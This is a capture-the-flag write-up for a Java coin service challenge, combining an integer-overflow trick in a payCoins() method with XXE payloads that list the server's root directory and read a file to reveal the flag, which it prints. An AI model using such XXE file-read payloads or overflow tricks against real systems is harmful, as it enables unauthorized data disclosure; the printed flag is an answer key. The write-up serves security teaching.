Day 13: JCoinz
--------------
We get a service running on a port and a jar file that seems to be the code of the service. When decompiling the jar file we see that we need more coinz. Initially we have only 1336 but we need 1337 to send the XML message to administrator which is probably the function we want to exploit. The code of the function payCoins() shows that we could use the signed int representation to trick the system:
```java
  public boolean payCoins(int amount)
  {
    if (getCoins() <= 0)
    {
      IO.printStatus("-", "No more jcoinz!\n\n");
      return false;
    }
    if (amount < 0) {
      amount *= -1;
    }
    int decreasedCoins = getCoins() - amount - Shop.transactionTax;
    if (decreasedCoins < 0)
    {
      IO.printStatus("-", "You cannot generate debts!\n\n");
      return false;
    }
    setCoins(decreasedCoins);
    
    IO.printStatus("-", "Decreased the account of \"" + getName() + "\" by " + String.valueOf(amount) + "\n");
    
    return true;
  }
```

To do this we need to have more than 0 coins, otherwise we are rejected by the first if clause. So we start by sending 1333 coins to charity (such that only 1 coin is left). Then, thanks to binary representation of signed integer the following happens when sending -2147483648 (0x80000000) coins to charity:

1. amount <0 => amount *= -1
2. amount is still the same thanks to signed int representation
3. decreasedCoins = 1 - amount - 2 = (1 - 0x80000000) - 2  = (0x80000001) - 2 = 0x7fffffff = 2147483647
4. since decreasedCoins is >0 we get that amount on our account.

Now we can start to play with the send XML function. We see that our messages are somehow processed and displayed back. And then when XML is processed we can start some tests with XXE and we see immediately that it works, see the excerpt below:
```
[?] Action: 2
[-] Decreased the account of "billy" by 1337
[?] XML Message: <!DOCTYPE doc [<!ENTITY e "FOO">]><doc><a>&e;</a></doc>
[+] Your secret xml message: <doc><a>FOO</a></doc>
```

Then we use the SYSTEM keyword to see if we can access the current directory:
```
[?] Action: 2
[-] Decreased the account of "billy" by 1337
[?] XML Message: <!DOCTYPE doc [<!ENTITY e SYSTEM "./">]><doc><a>&e;</a></doc>
[+] Your secret xml message: <doc><a>.dockerenv
bin
dev
etc
home
lib
lib64
linuxrc
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</a></doc>
```

We can then browse the file system (slowly) lookingfor something interesting and in the end we locate a file in the /home/jcoinz directory that contains the flag:
```
[?] Action: 2
[-] Decreased the account of "billy" by 1337
[?] XML Message: <!DOCTYPE doc [<!ENTITY e SYSTEM "/home/jcoinz/9f40461baba9bf00ba9174beeeb9b8a80c0ffba6">]><doc><a>&e;</a></doc>
[+] Your secret xml message: <doc><a>
You did it!

Greets, MuffinX

HV16-y4h0-g00t-d33m-c01n-zzzz

If you liked this challenge, tweet me: https://twitter.com/muffiniks
</a></doc>
```

And the flag is:

> HV16-y4h0-g00t-d33m-c01n-zzzz
